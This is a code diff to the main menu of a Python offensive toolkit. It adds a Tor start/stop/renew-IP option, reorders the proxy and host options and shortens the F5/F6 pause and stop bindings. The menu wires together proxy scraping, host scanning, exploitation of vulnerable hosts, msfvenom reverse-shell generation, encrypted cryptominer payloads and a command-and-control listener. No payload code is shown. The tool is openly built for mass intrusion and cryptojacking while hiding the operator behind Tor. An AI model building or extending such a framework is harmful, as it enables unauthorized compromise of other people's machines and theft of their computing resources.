@@ -13,8 +13,20 @@ from globals import (
     pause_event,
     stop_event,
 )
-from modules.proxy_handler import load_proxies, test_proxies, scrape_proxies, add_proxy_sources, clear_proxies, load_checked_proxies
-from modules.host_handler import load_hosts, load_ip_ranges, test_hosts, load_tested_hosts
+from modules.proxy_handler import (
+    load_proxies,
+    test_proxies,
+    scrape_proxies,
+    add_proxy_sources,
+    load_checked_proxies,
+    clear_proxies,
+)
+from modules.host_handler import (
+    load_hosts,
+    load_ip_ranges,
+    test_hosts,
+    load_previous_hosts,
+)
 from modules.scanner import scan_hosts, show_results, clear_results
 from modules.exploit import identify_vulnerable_hosts, exploit_vulnerable_hosts
 from modules.utils import clear_all_chunks, split_large_csvs, ensure_wordlists, ensure_valid_hosts
@@ -23,6 +35,7 @@ from modules.config_handler import configure_settings
 from modules.shell_generator import generate_msfvenom_shell, encrypt_generated_shell, list_payloads
 from modules.miner_payload import encrypt_all_cryptominers, list_cryptominers
 from modules.command_control import start_listener, c2_interface, start_apache_server, stop_listeners
+from modules.tor_handler import start_tor, renew_tor_ip, stop_tor
 import os
 import keyboard
 
@@ -34,12 +47,12 @@ def main_menu():
         print("2.) Scrape Proxies")
         print("3.) Load Proxies")
         print("4.) Test Proxies")
-        print("5.) Clear Proxies")
-        print("6.) Load Previously Checked Proxies")
+        print("5.) Load Checked Proxies")
+        print("6.) Clear Proxies")
         print("7.) Load Hosts")
         print("8.) Load IP Ranges")
-        print("9.) Test Hosts")
-        print("10.) Load Previously Tested Hosts")
+        print("9.) Load Previously Tested Hosts")
+        print("10.) Test Hosts")
         print("11.) Scan Hosts")
         print("12.) Show Results")
         print("13.) Clear Results")
@@ -52,7 +65,8 @@ def main_menu():
         print("20.) Generate Reverse Shell")
         print("21.) Manage Cryptominers")
         print("22.) Command and Control Center")
-        print("23.) Exit")
+        print("23.) Start/Stop Tor Proxy")
+        print("24.) Exit")
 
         choice = input("Enter your choice: ")
         if choice == "1":
@@ -64,17 +78,17 @@ def main_menu():
         elif choice == "4":
             global_tested_proxies[:] = test_proxies(global_scraped_proxies)
         elif choice == "5":
-            clear_proxies()
+            global_tested_proxies[:] = load_checked_proxies()
         elif choice == "6":
-            global_scraped_proxies[:] = load_checked_proxies()
+            clear_proxies()
         elif choice == "7":
             global_hosts[:] = load_hosts()
         elif choice == "8":
             global_hosts[:] = load_ip_ranges()
         elif choice == "9":
-            global_live_hosts[:] = test_hosts(global_hosts, global_tested_proxies)
+            global_hosts[:] = load_previous_hosts()
         elif choice == "10":
-            global_live_hosts[:] = load_tested_hosts()
+            global_live_hosts[:] = test_hosts(global_hosts, global_tested_proxies)
         elif choice == "11":
             scan_hosts()
         elif choice == "12":
@@ -169,34 +183,24 @@ def main_menu():
                 stop_listeners()
             elif c2_choice == "5":
                 continue
-            else:
-                print("[ERROR] Invalid choice.")
         elif choice == "23":
+            tor_action = input("[INFO] Start Tor (1), Stop Tor (2), Renew Tor IP (3): ")
+            if tor_action == "1":
+                start_tor()
+            elif tor_action == "2":
+                stop_tor()
+            elif tor_action == "3":
+                renew_tor_ip()
+        elif choice == "24":
             print("[INFO] Exiting. Stopping all listeners and background tasks.")
             stop_listeners()
+            stop_tor()
             break
 
 
 def setup_keyboard_controls():
-    """
-    Set up F key bindings for pausing and stopping scans.
-    """
-    def toggle_pause():
-        if pause_event.is_set():
-            print("[INFO] Resuming...")
-            pause_event.clear()
-        else:
-            print("[INFO] Pausing...")
-            pause_event.set()
-
-    def stop_scan():
-        print("[INFO] Stopping...")
-        stop_event.set()
-
-    # Bind F keys
-    keyboard.add_hotkey("F5", toggle_pause)
-    keyboard.add_hotkey("F6", stop_scan)
-
+    keyboard.add_hotkey("F5", lambda: pause_event.set() if not pause_event.is_set() else pause_event.clear())
+    keyboard.add_hotkey("F6", lambda: stop_event.set())
     print("[INFO] Press F5 to pause/resume and F6 to stop scanning.")
 
 setup_keyboard_controls()
